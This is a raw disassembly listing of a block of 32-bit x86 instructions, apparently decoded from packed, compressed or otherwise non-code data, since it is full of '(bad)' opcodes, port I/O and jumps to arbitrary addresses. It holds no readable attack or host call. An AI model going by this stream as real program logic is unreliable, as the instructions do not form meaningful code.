  416b0c:	sub    al,0xd6
  416b0e:	aam    0xa0
  416b10:	dec    edx
  416b11:	(bad)  
  416b12:	dec    esp
  416b13:	mov    eax,0x8890d879
  416b18:	ss call 0xc306e6be
  416b1e:	jmp    0xf17e62f4
  416b23:	sub    BYTE PTR [edx+0x43],dh
  416b26:	mov    esp,0xf1746982
  416b2b:	pop    ss
  416b2c:	add    al,0xbb
  416b2e:	push   es
  416b2f:	(bad)  
  416b30:	icebp  
  416b31:	adc    eax,0x8b070c79
  416b36:	sbb    ecx,ecx
  416b38:	push   eax
  416b39:	pushf  
  416b3a:	in     eax,dx
  416b3b:	mov    esp,?
  416b3d:	stc    
  416b3e:	mov    ebp,0xb5630a9d
  416b43:	mov    ch,0xab
  416b45:	jmp    0x15e0f37d
  416b4a:	idiv   DWORD PTR [ebx]
  416b4c:	ins    BYTE PTR es:[edi],dx
  416b4d:	dec    esp
  416b4e:	arpl   WORD PTR ds:0x290e596f,di
  416b54:	xor    BYTE PTR [ecx],dl
  416b56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b57:	(bad)  
  416b58:	mov    al,0xaf
  416b5a:	pop    ebp
  416b5b:	push   0xffffff8d
  416b5d:	mov    dl,0x7b
  416b5f:	loopne 0x416b56
  416b61:	stos   DWORD PTR es:[edi],eax
  416b62:	xchg   ecx,eax
  416b63:	sahf   
  416b64:	loopne 0x416bc2
  416b66:	xlat   BYTE PTR ds:[ebx]
  416b67:	or     edx,edx
  416b69:	inc    ebp
  416b6a:	or     edx,DWORD PTR [eax-0x31]
  416b6d:	sbb    al,BYTE PTR [ecx]
  416b6f:	add    esp,DWORD PTR [ebx+0x71]
  416b72:	(bad)  
  416b73:	in     eax,dx
  416b74:	or     ebx,DWORD PTR [ecx+eiz*4-0x31e6b2bb]
  416b7b:	jp     0x416b39
  416b7d:	mov    ds:0xf3156718,eax
  416b82:	mov    esi,0xababcf03
  416b87:	cmp    BYTE PTR [ecx-0xba4a45a],ch
  416b8d:	gs sbb eax,0xafa799d
  416b93:	ret    
  416b94:	fxch   st(0)
  416b96:	mov    ebx,esp
  416b98:	push   0x37
  416b9a:	out    dx,al
  416b9b:	adc    esi,0x4a772ce
  416ba1:	or     esi,DWORD PTR [ecx]
  416ba3:	pusha  
  416ba4:	loopne 0x416b76
  416ba6:	fldcw  WORD PTR [ecx+0x6bf0f073]
  416bac:	jmp    esp
  416bae:	pop    edi
  416baf:	push   ds
  416bb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416bb1:	in     eax,0xc3
  416bb3:	dec    esi
  416bb4:	xchg   esi,eax
  416bb5:	or     BYTE PTR [edi+0x48702d1f],0x5b
  416bbc:	(bad)  
  416bbd:	pop    ecx
  416bbe:	aam    0x32
  416bc0:	loopne 0x416c39
  416bc2:	push   eax
  416bc3:	daa    
  416bc4:	pop    esi
  416bc5:	jno    0x416c30
  416bc7:	fdiv   DWORD PTR [esi-0x6085b9e4]
  416bcd:	ins    DWORD PTR es:[edi],dx
  416bce:	jmp    FWORD PTR [ebx+0x55]
  416bd1:	sti    
  416bd2:	popf   
  416bd3:	es push es
  416bd5:	sub    al,0xf4
  416bd7:	adc    al,0xed
  416bd9:	push   ebp
  416bda:	add    esp,DWORD PTR [ecx]
  416bdc:	xchg   edi,eax
  416bdd:	out    0xa4,al
  416bdf:	ss mov ebp,0x97576a77
  416be5:	cmp    eax,0x3d4a90e6
  416bea:	push   es
  416beb:	arpl   WORD PTR [ecx+0x6a],si
  416bee:	pop    ecx
  416bef:	jge    0x416c03
  416bf1:	mov    edi,0xfb99ab24
  416bf6:	or     al,0x9a
  416bf8:	xchg   ebx,eax
  416bf9:	stc    
  416bfa:	ffree  st(7)
  416bfc:	mov    dh,0x81
  416bfe:	jb     0x416bb9
  416c00:	popf   
  416c01:	loope  0x416ba2
  416c03:	(bad)  
  416c04:	ss push ss
  416c06:	aam    0xc4
  416c08:	mov    ebx,0xa68481bd
  416c0d:	mov    ?,WORD PTR [ebx+0x30]
  416c10:	sbb    BYTE PTR [ebx+ebx*1+0x56],al
  416c14:	fwait
  416c15:	enter  0xc639,0x21
  416c19:	sub    ecx,DWORD PTR [ecx+0x6e]
  416c1c:	outs   dx,DWORD PTR ds:[esi]
  416c1d:	cmp    BYTE PTR [esi-0x6d55d68c],dl
  416c23:	dec    eax
  416c24:	push   eax
  416c25:	adc    al,0x98
  416c27:	rcl    DWORD PTR [edi+0x68fd4adb],1
  416c2d:	pop    edx
  416c2e:	add    DWORD PTR [eax+0x33],0xffffffd0
  416c32:	test   al,0x2c
  416c34:	mov    al,ds:0x93524de7
  416c39:	jge    0x416c5d
  416c3b:	or     dl,BYTE PTR [ecx]
  416c3d:	lahf   
  416c3e:	add    ebp,DWORD PTR [di-0x2]
  416c42:	xor    cl,bh
  416c44:	sti    
  416c45:	call   0x69ea:0xb4b123a8
  416c4c:	jle    0x416cbd
  416c4e:	sbb    DWORD PTR [esi-0x59ef1ae3],ecx
  416c54:	jae    0x416bef
  416c56:	into   
  416c57:	jge    0x416c6c
  416c59:	jae    0x416c66
  416c5b:	fwait
  416c5c:	dec    ebp
  416c5d:	jo     0x416c03
  416c5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c60:	xor    BYTE PTR [edx],dh
  416c62:	push   edi
  416c63:	pop    esi
  416c64:	aas    
  416c65:	xor    al,BYTE PTR [ebx-0x5f]
  416c68:	pop    ebx
  416c69:	mov    eax,0x4dac6621
  416c6e:	cwde   
  416c6f:	arpl   WORD PTR [ebx-0x78029b80],di
  416c75:	mov    ds:0xa5b55c90,eax
  416c7a:	mov    esp,0x7855f2dd
  416c7f:	inc    ebx
  416c80:	jl     0x416c90
  416c82:	and    edi,DWORD PTR [edx+ebx*4-0x51]
  416c86:	mov    BYTE PTR ds:0xae8827bf,bh
  416c8c:	out    0x69,al
  416c8e:	ror    BYTE PTR [edx+ebx*2-0x65],1
  416c92:	fsub   QWORD PTR [ecx]
  416c94:	add    bh,BYTE PTR [eax-0x636d8296]
  416c9a:	add    BYTE PTR [eax-0x7a83c7f6],bh
  416ca0:	mov    ebp,0xff743b81
  416ca5:	sub    bl,dh
  416ca7:	inc    ebx
  416ca8:	cld    
  416ca9:	xchg   ecx,eax
  416caa:	fnsave [edx]
  416cac:	out    dx,al
  416cad:	outs   dx,BYTE PTR ds:[esi]
  416cae:	xor    DWORD PTR [edx],ecx
  416cb0:	sub    ecx,DWORD PTR [edi+0x61d5b083]
  416cb6:	mov    bh,0xa2
  416cb8:	fstp   QWORD PTR ds:0x12d2b242
  416cbe:	mov    ds:0xefc2e394,eax
  416cc3:	xlat   BYTE PTR ds:[ebx]
  416cc4:	or     eax,0x7471232f
  416cc9:	cmp    BYTE PTR [edi+0x75],bl
  416ccc:	jp     0x416ced
  416cce:	(bad)  
  416ccf:	sub    al,0x28
  416cd1:	mov    dl,0x31
  416cd3:	push   ebp
  416cd4:	push   esp
  416cd5:	retf   0x5ee0
  416cd8:	in     al,dx
  416cd9:	repz shl DWORD PTR [ebx-0x63],0xb6
  416cde:	inc    ecx
  416cdf:	or     edx,DWORD PTR [esi+0x51afa8e7]
  416ce5:	dec    edx
  416ce6:	mov    ss:0xa932e2e3,al
  416cec:	jmp    0x416d42
  416cee:	mov    esp,ecx
  416cf0:	push   ebp
  416cf1:	ret    
  416cf2:	jnp    0x416d73
  416cf4:	sbb    DWORD PTR [ebp-0x396595b],ecx
  416cfa:	and    eax,0xd4076d2e
  416cff:	pop    eax
  416d00:	gs mov bl,0x5b
  416d03:	sbb    al,0x29
  416d05:	push   0x947f6da7
  416d0a:	mov    dh,0xc0
  416d0c:	(bad)  
  416d0d:	xchg   ecx,eax
  416d0e:	mov    eax,ds:0xde8a0df3
  416d13:	add    al,0x3a
  416d15:	cmp    eax,0x3185af2
  416d1a:	add    BYTE PTR [ebx+ebp*8-0x3a],ch
  416d1e:	sbb    al,0x1
  416d20:	mov    esp,DWORD PTR [edx]
  416d22:	sbb    BYTE PTR [eax-0x2a],dl
  416d25:	push   cs
  416d26:	repz in eax,dx
  416d28:	sub    ah,ch
  416d2a:	push   ebx
  416d2b:	fst    QWORD PTR [edi-0x130ee5f5]
  416d31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d32:	dec    esi
  416d33:	mov    ebp,0xca28bc39
  416d38:	xchg   ecx,eax
  416d39:	xor    al,0x7b
  416d3b:	ret    0xbcaa
  416d3e:	add    al,0x66
  416d40:	lods   eax,DWORD PTR ds:[esi]
  416d41:	add    ebp,DWORD PTR [edi]
  416d43:	ss mov esp,0xc91a7388
  416d49:	arpl   WORD PTR gs:[esi+ebp*1+0x53d67871],sp
  416d51:	retf   0x5fbb
  416d54:	mov    esi,0x6f6ecc90
  416d59:	in     al,0x9
  416d5b:	mov    al,0xe
  416d5d:	fcom   DWORD PTR [edx+eiz*4]
  416d60:	fdivrp st(4),st
  416d62:	test   eax,0xeb71408f
  416d67:	mov    esp,0xb8ba5190
  416d6c:	dec    edi
  416d6d:	add    edx,DWORD PTR [edi+0x503b81b0]
  416d73:	xchg   esp,eax
  416d74:	inc    ebp
  416d75:	clc    
  416d76:	adc    edi,DWORD PTR [esi+eax*8-0x26]
  416d7a:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  416d7c:	xor    dl,BYTE PTR [edi]
  416d7e:	ja     0x416daf
  416d80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416d81:	ja     0x416dcc
  416d83:	push   edx
  416d84:	cmp    al,0x4d
  416d86:	test   eax,0xfb8387be
  416d8b:	push   es
  416d8c:	into   
  416d8d:	out    0xb9,al
  416d8f:	xor    BYTE PTR [edi+0x2ab86f70],0xed
  416d96:	mov    ds:0xbcf696f5,eax
  416d9b:	adc    BYTE PTR [eax+0x550ebcdb],dh
  416da1:	mov    dh,0xb6
  416da3:	pop    esi
  416da4:	fsub   DWORD PTR [esi+esi*1-0x6db122f5]
  416dab:	repz scas al,BYTE PTR es:[edi]
  416dad:	test   eax,0x1d80fda9
  416db2:	sbb    al,0xf1
  416db4:	int    0xfb
  416db6:	and    al,0x94
  416db8:	fabs   
  416dba:	ds lahf 
  416dbc:	test   al,0x23
  416dbe:	mov    ds:0x5690ff35,al
  416dc3:	and    esp,edi
  416dc5:	out    dx,eax
  416dc6:	arpl   WORD PTR [ebx+0x4badf87c],di
  416dcc:	int3   
  416dcd:	xchg   BYTE PTR [edi+0x75],ah
  416dd0:	cmp    BYTE PTR [edi],cl
  416dd2:	xlat   BYTE PTR ds:[ebx]
  416dd3:	adc    esi,eax
  416dd5:	or     al,0x26
  416dd7:	adc    BYTE PTR [ecx+0x3a],0xc1
  416ddb:	mov    cl,0xb4
  416ddd:	ins    BYTE PTR es:[edi],dx
  416dde:	ds or  cl,al
  416de1:	ror    DWORD PTR [ecx],cl
  416de3:	sbb    eax,0x99b0dec5
  416de8:	ja     0x416d96
  416dea:	mov    DWORD PTR [esi],0xc6456955
  416df0:	leave  
  416df1:	mov    dh,0xf1
  416df3:	nop
  416df4:	pop    edx
  416df5:	and    BYTE PTR [ecx+0x5c8e4412],ah
  416dfb:	push   0xffffffd5
  416dfd:	ret    
  416dfe:	loope  0x416d9c
  416e00:	rol    BYTE PTR [eax-0x48],0xa
  416e04:	stc    
  416e05:	push   esp
  416e06:	data16 into 
  416e08:	test   dl,ah
  416e0a:	in     eax,dx
  416e0b:	push   esi
  416e0c:	fs lock aad 0xf1
  416e10:	pop    es
  416e11:	aas    
  416e12:	sub    DWORD PTR [edi-0x49d0d98e],edx
  416e18:	inc    edx
  416e19:	daa    
  416e1a:	test   BYTE PTR [esi-0x70],al
  416e1d:	pop    edi
  416e1e:	add    dh,bl
  416e20:	inc    eax
  416e21:	xchg   ecx,eax
  416e22:	(bad)  
  416e24:	(bad)  [ebx]
  416e26:	xchg   edi,eax
  416e27:	inc    ebp
  416e28:	out    dx,eax
  416e29:	mov    BYTE PTR [edx],dl
  416e2b:	xchg   esp,eax
  416e2c:	cmc    
  416e2d:	xchg   esp,eax
  416e2e:	pop    ebp
  416e2f:	aad    0x9a
  416e31:	or     al,0x56
  416e33:	inc    esi
  416e34:	popa   
  416e35:	sti    
  416e36:	push   cs
  416e37:	mov    edx,0x98404d5e
  416e3c:	mov    DWORD PTR [ebx-0x7474d97b],ebp
  416e42:	mov    al,0x7d
  416e44:	rcr    DWORD PTR ds:0x59719719,1
  416e4a:	aad    0x2a
  416e4c:	fisttp WORD PTR [ecx+0x710ec0f5]
  416e52:	ficomp WORD PTR [esi-0x7bf3e8e]
  416e58:	mov    edx,0xa6d3982e
  416e5d:	jne    0x416e4d
  416e5f:	clc    
  416e60:	scas   al,BYTE PTR es:[edi]
  416e61:	les    eax,FWORD PTR [ebx+0x66]
  416e64:	pop    ecx
  416e65:	in     al,dx
  416e66:	enter  0xe14f,0xe2
  416e6a:	push   edi
  416e6b:	repz jnp 0x416ea4
  416e6e:	out    dx,al
  416e6f:	add    al,cl
  416e71:	inc    eax
  416e72:	pop    edi
  416e73:	jb     0x416e5a
  416e75:	xor    BYTE PTR [ebp+0x17],dl
  416e78:	mov    eax,0x4c8f94fa
  416e7d:	shl    BYTE PTR [ecx-0x5f9eefdb],1
  416e83:	mov    al,ds:0xad6351ac
  416e88:	and    edx,0xf6f85a9f
  416e8e:	fist   WORD PTR [ecx+0x17]
  416e91:	pcmpeqw mm7,QWORD PTR [eax+0x56]
  416e95:	xchg   edx,eax
  416e96:	mov    ch,0x2b
  416e98:	(bad)  
  416e99:	imul   eax
  416e9b:	stos   BYTE PTR es:[edi],al
  416e9c:	fmul   DWORD PTR [eax+0x73]
  416e9f:	mov    es,WORD PTR [ecx-0x4e]
  416ea2:	jmp    0xa6da58cf
  416ea7:	arpl   WORD PTR [esi],ax
  416ea9:	adc    BYTE PTR [edx+0x9],ah
  416eac:	mov    edx,0x15342e10
  416eb1:	(bad)  
  416eb2:	mov    ecx,0xdbe0d3d2
  416eb7:	xchg   edx,eax
  416eb8:	stos   DWORD PTR es:[edi],eax
  416eb9:	jge    0x416e3f
  416ebb:	aad    0x7d
  416ebd:	lods   eax,DWORD PTR ds:[esi]
  416ebe:	arpl   WORD PTR [edx+0x322cfa90],sp
  416ec4:	adc    edi,DWORD PTR [ecx]
  416ec6:	mov    al,0x3f
  416ec8:	mov    ds:0x7309c779,eax
  416ecd:	push   0x3c888514
  416ed2:	pop    edx
  416ed3:	and    bh,BYTE PTR [ebx+eax*1]
  416ed6:	mov    eax,0x9616e36d
  416edb:	outs   dx,DWORD PTR ds:[esi]
  416edc:	leave  
  416edd:	dec    edx
  416ede:	in     eax,dx
  416edf:	sub    al,0x9d
  416ee1:	ja     0x416ed9
  416ee3:	aad    0x9
  416ee5:	dec    edx
  416ee6:	cmc    
  416ee7:	setl   BYTE PTR [edx+0xae16897]
  416eee:	or     eax,0x93da7310
  416ef3:	mov    ecx,0x4b32dd26
  416ef8:	sti    
  416ef9:	adc    eax,0x3d1697c0
  416efe:	inc    ebp
  416eff:	push   cs
  416f00:	pop    esi
  416f01:	add    dh,BYTE PTR [edi-0x41]
  416f04:	adc    eax,0x1e5ef3c2
  416f09:	(bad)  
  416f0a:	stos   BYTE PTR es:[edi],al
  416f0b:	sub    ch,BYTE PTR [eax-0x2d786c9a]
  416f11:	out    0xa3,al
  416f13:	leave  
  416f14:	mov    eax,0xce38cd57
  416f19:	rcl    BYTE PTR [eax],0x77
  416f1c:	sub    ch,0xf6
  416f1f:	add    edi,DWORD PTR [ecx+0x63]
  416f22:	add    DWORD PTR [ebx+ecx*1],ebx
  416f25:	inc    edx
  416f26:	data16 sub BYTE PTR [esi-0x7d],al
  416f2a:	fidivr DWORD PTR [edi+0x11]
  416f2d:	mov    BYTE PTR [edx-0x70],dh
  416f30:	mov    esp,DWORD PTR [esi]
  416f32:	test   DWORD PTR [ebp+0x67933343],ebp
  416f38:	in     al,dx
  416f39:	and    DWORD PTR [ebx-0x7e],esp
  416f3c:	push   0xdc1fc12a
  416f41:	dec    ebp
  416f42:	idiv   DWORD PTR [esp+ecx*8]
  416f45:	mov    cl,0x74
  416f47:	mov    DWORD PTR ds:0xa663e033,esi
  416f4d:	iret   
  416f4e:	inc    edx
  416f4f:	inc    ebp
  416f50:	(bad)  
  416f51:	out    dx,al
  416f52:	jle    0x416f0f
  416f54:	cld    
  416f55:	adc    al,0x22
  416f57:	frstor [eax-0x3ec56767]
  416f5d:	push   ebx
  416f5e:	sbb    DWORD PTR [edx],edx
  416f60:	mov    eax,0xb11d50ed
  416f65:	mov    eax,ds:0xb3786d8
  416f6a:	call   FWORD PTR fs:[ecx+0xe]
  416f6e:	and    esi,DWORD PTR [edi+0x6b]
  416f71:	arpl   WORD PTR ds:0x2c48273b,dx
  416f77:	ds xchg esi,eax
  416f79:	mov    bl,0x12
  416f7b:	mov    esi,0xa94782cb
  416f80:	mov    ebx,0xec4c0efc
  416f85:	add    ecx,DWORD PTR [edi]
  416f87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f88:	js     0x416ff4
  416f8a:	or     BYTE PTR [edi+0x75207f37],bl
  416f90:	or     ecx,DWORD PTR [edx+0x36]
  416f93:	mov    esi,0xfb74afb9
  416f98:	mov    esi,0x508d9e97
  416f9d:	daa    
  416f9e:	cmp    eax,DWORD PTR [edi+esi*4-0x32]
  416fa2:	aaa    
  416fa3:	call   0xbc4ec4fb
  416fa8:	(bad)  
  416fa9:	stc    
  416faa:	in     al,0x68
  416fac:	push   ss
  416fad:	mov    esp,?
  416faf:	out    dx,eax
  416fb0:	push   ss
  416fb1:	mov    eax,ds:0x750f1713
  416fb6:	xchg   ebp,eax
  416fb7:	jnp    0x416faa
  416fb9:	jno    0x416f68
  416fbb:	inc    edi
  416fbc:	add    eax,0x8fc72aba
  416fc1:	jl     0x416fa1
  416fc3:	xor    esp,DWORD PTR [eax-0x35085ff8]
  416fc9:	sub    edi,DWORD PTR ds:0x553a523a
  416fcf:	sub    al,0xb9
  416fd1:	sub    DWORD PTR [edi+eax*8+0x73d382c6],edx
  416fd8:	lds    esi,FWORD PTR [ecx-0x2]
  416fdb:	and    al,0xbc
  416fdd:	div    DWORD PTR [ebx]
  416fdf:	pushf  
  416fe0:	cmp    al,0x1c
  416fe2:	pop    esp
  416fe3:	test   BYTE PTR [edi+0x47],0xb5
  416fe7:	sub    BYTE PTR [eax+ecx*8-0x5e],ch
  416feb:	sub    BYTE PTR [edi+0x1],bl
  416fee:	mov    esi,0xd5c045aa
  416ff3:	fcmovne st,st(5)
  416ff5:	retf   
  416ff6:	call   0x4771:0x5e3b29f4
  416ffd:	inc    ecx
  416ffe:	dec    edx
  416fff:	add    al,0x6a
  417001:	inc    ecx
  417002:	ds into 
  417004:	repnz and eax,0xcbc778ea
  41700a:	loope  0x417072
  41700c:	enter  0x51ae,0x2d
  417010:	pop    eax
  417011:	test   BYTE PTR [ebp+0x40],al
  417014:	fadd   DWORD PTR [edi-0x7b]
  417017:	cmp    al,0xca
  417019:	lahf   
  41701a:	pusha  
  41701b:	sbb    ecx,DWORD PTR [eax-0xf3076c4]
  417021:	test   BYTE PTR [ebp+0x6d],bh
  417024:	xchg   ebp,eax
  417025:	repnz mov ebp,DWORD PTR [edi+0x10]
  417029:	xor    BYTE PTR [ebp-0x58],bh
  41702c:	add    BYTE PTR [eax],bl
  41702e:	pop    edi
  41702f:	sub    dl,BYTE PTR [esi]
  417031:	and    DWORD PTR [esi-0x5171e056],0xffffffbd
  417038:	into   
  417039:	test   BYTE PTR [edx+ebx*8+0x29],al
  41703d:	inc    esi
  41703e:	xor    al,0xfe
  417040:	sub    BYTE PTR [ebp-0x7cf61f65],dh
  417046:	ss jl  0x417093
  417049:	add    dh,bl
  41704b:	sub    al,ah
  41704d:	aad    0x20
  41704f:	ins    DWORD PTR es:[edi],dx
  417050:	lahf   
  417051:	stos   DWORD PTR es:[edi],eax
  417052:	das    
  417053:	enter  0xa6a9,0xf1
  417057:	cmp    BYTE PTR [esi],dh
  417059:	cmp    BYTE PTR [eax+ecx*2],dl
  41705c:	dec    edx
  41705d:	mov    al,0xf1
  41705f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417060:	sub    DWORD PTR [edi-0x13],esp
  417063:	rol    DWORD PTR [eax+ebp*2],0xf4
  417067:	dec    eax
  417068:	push   ds
  417069:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41706a:	fldcw  WORD PTR [ebx]
  41706c:	adc    ecx,DWORD PTR [ebx]
  41706e:	sbb    BYTE PTR [edi],ch
  417070:	pop    ds
  417071:	jnp    0x4170b1
  417073:	pop    es
  417074:	sub    ecx,DWORD PTR [esi]
  417076:	out    dx,al
  417077:	adc    BYTE PTR [edx],bh
  417079:	pop    ebp
  41707a:	mov    al,0x59
  41707c:	mov    eax,ds:0x766032f0
  417081:	scas   eax,DWORD PTR es:[edi]
  417082:	es sub al,0xf4
  417085:	(bad)  
  417086:	push   cs
  417087:	push   es
  417088:	int    0x5e
  41708a:	sbb    dh,BYTE PTR [ecx+0x291edcb]
  417090:	aas    
  417091:	out    dx,al
  417092:	pop    ebx
  417093:	xor    dl,al
  417095:	sbb    dl,BYTE PTR [edi-0x4c4999fd]
  41709b:	sbb    eax,0x1f11901d
  4170a0:	mov    dh,0x43
  4170a2:	stc    
  4170a3:	int    0x1e
  4170a5:	shr    DWORD PTR [ebx-0x44],0x10
  4170a9:	jbe    0x4170aa
  4170ab:	pop    eax
  4170ac:	push   es
  4170ad:	aas    
  4170ae:	in     al,dx
  4170af:	xchg   ecx,eax
  4170b0:	sbb    eax,DWORD PTR [ecx]
  4170b2:	out    0xbd,eax
  4170b4:	in     eax,dx
  4170b5:	repz push ebp
  4170b7:	jl     0x4170b3
  4170b9:	out    0xa9,eax
  4170bb:	dec    ecx
  4170bc:	adc    al,0xbd
  4170be:	scas   al,BYTE PTR es:[edi]
  4170bf:	dec    ebp
  4170c0:	icebp  
  4170c1:	pop    ecx
  4170c2:	out    0xda,al
  4170c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4170c5:	ds mov ecx,0x36d3523d
  4170cb:	pop    ss
  4170cc:	fwait
  4170cd:	sbb    al,0x89
  4170cf:	pop    es
  4170d0:	xor    eax,0x924efd29
  4170d5:	sbb    dl,bl
  4170d7:	adc    BYTE PTR [ebx+0x42],ah
  4170da:	scas   eax,DWORD PTR es:[edi]
  4170db:	gs jl  0x4170eb
  4170de:	xor    bh,bl
  4170e0:	inc    esp
  4170e1:	out    0xa,al
  4170e3:	adc    al,0xde
  4170e5:	test   al,ah
  4170e7:	add    bl,ch
  4170e9:	ins    BYTE PTR es:[edi],dx
  4170ea:	sbb    dl,BYTE PTR [eax-0x6733ba3f]
  4170f0:	fwait
  4170f1:	ss ror bl,0x18
  4170f5:	int    0xd9
  4170f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4170f8:	lahf   
  4170f9:	cld    
  4170fa:	dec    ebp
  4170fb:	mov    bh,0x7
  4170fd:	add    edi,0xc849aa81
  417103:	xchg   ebp,eax
  417104:	jp     0x4170dd
  417106:	mov    ds:0xee89d704,eax
  41710b:	mov    WORD PTR [esi-0x23],ds
  41710e:	add    eax,0xb9eb2bf
  417113:	mov    eax,0x2c9fe138
  417118:	push   ecx
  417119:	mov    eax,ds:0x3d724864
  41711e:	inc    esp
  41711f:	imul   eax,DWORD PTR [ebx+0x40],0x5d5fcc33
  417126:	inc    ebx
  417127:	lods   al,BYTE PTR ds:[esi]
  417128:	and    ecx,ecx
  41712a:	fist   DWORD PTR [eax]
  41712c:	dec    ebp
  41712d:	or     DWORD PTR [edx-0x6b],esp
  417130:	add    dh,BYTE PTR [eax-0x7d]
  417133:	or     al,0x8f
  417135:	adc    dl,BYTE PTR [esi+0x4e]
  417138:	xchg   DWORD PTR ds:0x8581e0fb,ebp
  41713e:	popa   
  41713f:	pop    eax
  417140:	fldenv [edi+0x55]
  417143:	rcl    DWORD PTR [eax-0x1f],0x8c
  417147:	mov    eax,0xea0fadb0
  41714c:	inc    edi
  41714d:	sti    
  41714e:	jnp    0x417182
  417150:	out    dx,al
  417151:	jp     0x4170f3
  417153:	sti    
  417154:	stos   DWORD PTR es:[edi],eax
  417155:	arpl   WORD PTR [edx-0x16],dx
  417158:	jns    0x41715e
  41715a:	pushf  
  41715b:	cmp    BYTE PTR ds:0x70f0b814,cl
  417161:	out    0xf6,eax
  417163:	dec    edi
  417164:	outs   dx,DWORD PTR ds:[esi]
  417165:	int    0xf6
  417167:	out    dx,al
  417168:	shl    DWORD PTR [ebp+0x71],1
  41716b:	adc    eax,0x7f4c2df9
  417170:	test   DWORD PTR [esi],ecx
  417172:	loopne 0x41716d
  417174:	inc    esp
  417175:	sahf   
  417176:	mov    esi,0x2709e152
  41717b:	xor    BYTE PTR [ecx-0x7c733e76],dh
  417181:	rcl    BYTE PTR [ecx+0x6],0xe
  417185:	lahf   
  417186:	enter  0xef4c,0x23
  41718a:	jg     0x417121
  41718c:	jo     0x4171bd
  41718e:	(bad)  
  41718f:	or     DWORD PTR [edi+0x31],esp
  417192:	sbb    ebx,esi
  417194:	mov    bl,0x4a
  417196:	gs test esp,eax
  417199:	add    eax,edi
  41719b:	jge    0x4171b8
  41719d:	adc    DWORD PTR [ebx-0x288bf0fc],edi
  4171a3:	cmp    esi,edi
  4171a5:	into   
  4171a6:	lock mov es,WORD PTR [edi]
  4171a9:	(bad)  
  4171aa:	cli    
  4171ab:	cmp    al,0x4
  4171ad:	sub    eax,0x12556cec
  4171b2:	lods   al,BYTE PTR ds:[esi]
  4171b3:	pushf  
  4171b4:	jnp    0x41722e
  4171b6:	mov    cl,0x58
  4171b8:	sub    cl,ah
  4171ba:	inc    ebx
  4171bb:	(bad)  
  4171bc:	dec    esp
  4171bd:	and    BYTE PTR [edx],bl
  4171bf:	jg     0x4171dc
  4171c1:	dec    edx
  4171c2:	mov    BYTE PTR [edx],0x11
  4171c5:	mov    al,ds:0x8f64fdc9
  4171ca:	out    dx,al
  4171cb:	and    edi,DWORD PTR [eax+0x395f51ce]
  4171d1:	stos   DWORD PTR es:[edi],eax
  4171d2:	call   0xa06e:0xe53d25e3
  4171d9:	jb     0x417177
  4171db:	stos   DWORD PTR es:[edi],eax
  4171dc:	mov    cl,0xba
  4171de:	repz dec ebx
  4171e1:	jmp    0x1e9ef390
  4171e6:	(bad)  
  4171e7:	cwde   
  4171e8:	imul   esi,DWORD PTR [ebx+0x19],0x4450bb51
  4171ef:	stos   BYTE PTR es:[edi],al
  4171f0:	out    dx,eax
  4171f1:	jno    0x4171e1
  4171f3:	(bad)  
  4171f4:	cs cmp dl,cl
  4171f7:	sub    ah,BYTE PTR [eax+0x76]
  4171fa:	inc    ebp
  4171fb:	sub    DWORD PTR [ecx+0x2dd483dd],eax
  417201:	inc    esp
  417202:	call   FWORD PTR [ecx]
  417204:	dec    esp
  417205:	ss jle 0x417192
  417208:	mov    bh,0xb9
  41720a:	aas    
  41720b:	dec    edx
  41720c:	cs or  BYTE PTR gs:[edi-0x2d],bl
  417211:	inc    eax
  417212:	xor    ecx,DWORD PTR [eax-0x35127905]
  417218:	aam    0x3d
  41721a:	jne    0x4171e9
  41721c:	cmp    esp,DWORD PTR [edi+0x1abb87f7]
  417222:	int    0x26
  417224:	popa   
  417225:	ins    BYTE PTR es:[edi],dx
  417226:	imul   esi,DWORD PTR ds:0x82e685a1,0xa787e772
  417230:	sub    DWORD PTR ds:0x9b881ca,ecx
  417236:	jnp    0x41725d
  417238:	inc    esi
  417239:	sub    eax,0x6b54a036
  41723e:	cmp    al,0x16
  417240:	mov    bl,0x4a
  417242:	js     0x417205
  417244:	push   es
  417245:	xor    DWORD PTR [edx-0x1f3ca094],ebx
  41724b:	xor    al,0x49
  41724d:	popa   
  41724e:	mov    WORD PTR [ecx+0x6dcd2517],ds
  417254:	adc    DWORD PTR [edx-0x2ae85150],ebx
  41725a:	je     0x4172be
  41725c:	sbb    al,BYTE PTR fs:[edi+0x36]
  417260:	and    eax,0x3ca4a9c2
  417265:	sub    eax,0x73f27c3c
  41726a:	mov    bl,BYTE PTR [eax-0x173b8f5c]
  417270:	xor    DWORD PTR [edx-0x5cdcdcc7],edi
  417276:	mov    ebx,DWORD PTR [ebx+0x32]
  417279:	(bad)  
  41727a:	lds    edx,FWORD PTR [ebx]
  41727c:	loope  0x417248
  41727e:	inc    edi
  41727f:	es in  al,0x6a
  417282:	mov    ebx,0x5fc1c2c
  417287:	pusha  
  417288:	jnp    0x417274
  41728a:	hlt    
  41728b:	popa   
  41728c:	adc    eax,0x2f3f9e1e
  417291:	pop    edi
  417292:	test   DWORD PTR [edi+0x42],eax
  417295:	sbb    BYTE PTR [ebx+0x24],bl
  417298:	mov    dl,0x0
  41729a:	inc    ebx
  41729b:	cmc    
  41729c:	aam    0x8
  41729e:	mov    edx,0x3e52f349
  4172a3:	xchg   edi,eax
  4172a4:	adc    dh,bl
  4172a6:	(bad)  
  4172a7:	jnp    0x41724d
  4172a9:	mov    cl,0x1f
  4172ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172ac:	mov    eax,0x8b6e2a8f
  4172b1:	sbb    esp,0xc98a2e11
  4172b7:	sbb    al,0x4c
  4172b9:	ds push cs
  4172bb:	jg     0x4172cb
  4172bd:	cmp    DWORD PTR ds:0x881bcc21,eax
  4172c3:	pop    ss
  4172c4:	scas   al,BYTE PTR es:[edi]
  4172c5:	mov    ebx,0x56b974a9
  4172ca:	int3   
  4172cb:	mov    ebx,0x55a0bb53
  4172d0:	lods   eax,DWORD PTR ds:[esi]
